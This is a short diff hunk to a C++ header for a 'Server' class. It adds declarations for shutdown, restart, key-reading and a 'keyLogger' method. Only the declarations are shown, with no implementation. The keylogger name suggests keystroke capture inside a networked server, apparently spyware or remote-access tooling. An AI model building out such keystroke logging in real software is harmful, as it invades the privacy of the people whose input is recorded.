@@ -10,6 +10,11 @@ public:
     ~Server();
     bool start();
     void listenForConnections();
+    void shutdownServer();
+    void restartServer();
+    void readKey(int);
+    void keyLogger();
+
 
 private:
     int port;
